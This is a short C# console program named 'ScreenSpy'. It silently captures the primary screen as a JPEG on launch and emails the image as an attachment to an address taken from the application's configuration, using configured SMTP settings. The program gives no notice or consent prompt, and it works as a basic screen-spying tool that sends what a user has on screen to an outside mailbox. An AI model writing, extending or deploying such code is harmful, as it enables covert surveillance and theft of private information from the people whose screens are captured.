using System;
using System.Collections.Generic;
using System.Configuration;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Linq;
using System.Net.Configuration;
using System.Net.Mail;
using System.Net.Mime;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace ScreenSpy
{
    class Program
    {
        private const string _screenShotFileName = "Last-{0}.jpg";

        private static void Main(string[] args)
        {
            var screen = Screen.PrimaryScreen;

            using (var bitmap = new Bitmap(screen.Bounds.Width, screen.Bounds.Height))
            using (var graphics = Graphics.FromImage(bitmap))
            {
                graphics.CopyFromScreen(new Point(screen.Bounds.Left, screen.Bounds.Top), new Point(0, 0), screen.Bounds.Size);
                using (var ms = new MemoryStream())
                {
                    bitmap.Save(ms, ImageFormat.Jpeg);
                    ms.Seek(0, 0);
                    SendScreenShot(ms);
                }
            }
        }

        private static void SendScreenShot(Stream image)
        {
            SmtpSection settings = (SmtpSection)ConfigurationManager.GetSection("system.net/mailSettings/smtp");
            if (settings == null)
            {
                throw new Exception("Smtp settings not provided");
            }

            var now = DateTime.Now;
            var to = ConfigurationManager.AppSettings["To"];

            var smtpClient = new SmtpClient();

            var message = new MailMessage(settings.From, to)
            {
                Subject = string.Format("Screenshot taken at {0}", now)
            };

            var attachment = new Attachment(image, string.Format(_screenShotFileName, now), MediaTypeNames.Image.Jpeg);
            message.Attachments.Add(attachment);

            smtpClient.Send(message);
        }
    }
}
